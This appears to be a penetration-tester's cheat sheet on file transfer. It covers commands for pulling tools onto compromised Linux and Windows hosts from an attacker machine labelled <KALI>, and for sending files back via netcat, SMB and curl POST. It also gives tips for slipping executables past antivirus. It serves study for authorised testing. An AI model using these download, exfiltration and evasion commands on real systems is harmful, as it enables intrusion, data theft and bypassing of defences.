# File Transfers

Getting tools onto a target and files off it. Know at least 3 methods per OS - AV or firewall will block some.

---

## Serving Files from Kali

Always start here - pick a server method and keep it running.

```sh
# Python HTTP server (most common)
python3 -m http.server 8080
python3 -m http.server 80      # port 80 - less likely to be blocked

# SMB server (for Windows targets that can't use HTTP)
impacket-smbserver share . -smb2support
impacket-smbserver share /path/to/files -smb2support -username user -password pass

# FTP server
python3 -m pyftpdlib -p 21 -w   # -w = allow writes

# Netcat listener (send one file)
nc -lvnp 4444 < file.exe
```

---

## Linux Target - Downloading Files

```sh
# wget
wget http://<KALI>:8080/file.sh -O /tmp/file.sh

# curl
curl http://<KALI>:8080/file.sh -o /tmp/file.sh
curl -O http://<KALI>:8080/file.sh          # saves with original filename

# Netcat receive
nc -lvnp 4444 > received_file
# On Kali: nc <target> 4444 < file_to_send

# Bash /dev/tcp (no tools needed)
bash -c 'cat < /dev/tcp/<KALI>/8080 > /tmp/file'

# SCP (if SSH access)
scp user@<KALI>:/path/to/file /tmp/file
```

---

## Windows Target - Downloading Files

```sh
# certutil (almost always available - old school but reliable)
certutil -urlcache -split -f http://<KALI>:8080/file.exe C:\temp\file.exe

# PowerShell iwr (Invoke-WebRequest)
iwr -uri http://<KALI>:8080/file.exe -OutFile C:\temp\file.exe

# PowerShell WebClient (alternative)
(New-Object Net.WebClient).DownloadFile("http://<KALI>:8080/file.exe", "C:\temp\file.exe")

# Bitsadmin (background transfer - sneaky)
bitsadmin /transfer job http://<KALI>:8080/file.exe C:\temp\file.exe

# From SMB share (no download - run directly or copy)
copy \\<KALI>\share\file.exe C:\temp\file.exe
\\<KALI>\share\file.exe           # run directly without downloading

# curl (Windows 10+)
curl http://<KALI>:8080/file.exe -o C:\temp\file.exe
```

**evil-winrm built-in (if using evil-winrm):**
```sh
upload /kali/path/file.exe          # upload to target
download C:\target\file.txt         # download from target
```

---

## Windows Target - Uploading Files Back to Kali

```sh
# Via SMB server on Kali
impacket-smbserver share . -smb2support
# On target:
copy C:\target\file.txt \\<KALI>\share\file.txt

# Via curl POST (if Kali running upload server)
# On Kali:
python3 -c "
import http.server, cgi
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        f = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
        open(f['file'].filename,'wb').write(f['file'].file.read())
        self.send_response(200); self.end_headers()
http.server.HTTPServer(('',8080),H).serve_forever()"
# On target:
curl -F "file=@C:\target\file.txt" http://<KALI>:8080/

# Via nc
# On Kali: nc -lvnp 4444 > received.txt
# On target: type C:\file.txt | nc <KALI> 4444
```

---

## Base64 Encode/Decode (No HTTP Needed)

When you only have a shell and no network tools - paste the file as text.

**Kali -> encode:**
```sh
base64 -w 0 file.exe > file.b64
cat file.b64         # copy the output
```

**On target - decode:**
```powershell
# PowerShell
[System.Convert]::FromBase64String("BASE64STRING") | Set-Content -Path C:\temp\file.exe -Encoding Byte

# Or write to file and decode
$b64 = "BASE64STRING"
[IO.File]::WriteAllBytes("C:\temp\file.exe", [Convert]::FromBase64String($b64))
```

**Linux target:**
```sh
echo "BASE64STRING" | base64 -d > file.exe
```

---

## Quick Writable Directories

### Windows
```
C:\temp\                    # create if doesn't exist
C:\Windows\Temp\
C:\Users\Public\
C:\inetpub\wwwroot\         # web root - accessible via browser too
%APPDATA%\
```

### Linux
```
/tmp/
/dev/shm/                   # RAM - no disk writes, cleared on reboot
/var/tmp/
/home/<user>/
```

---

## AV Blocking Your Transfer

If AV kills the file on download:

```sh
# Rename to something benign
mv exploit.exe update.exe

# Change extension
mv shell.exe shell.txt        # transfer as .txt, rename after

# Encode it (base64 method above)

# Serve over HTTPS (self-signed - some AV skips HTTPS inspection)
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
python3 -c "
import http.server, ssl
s = http.server.HTTPServer(('',443), http.server.SimpleHTTPRequestHandler)
s.socket = ssl.wrap_socket(s.socket, keyfile='key.pem', certfile='cert.pem')
s.serve_forever()"
# On target: iwr https://<KALI>/file.exe -OutFile file.exe -SkipCertificateCheck
```
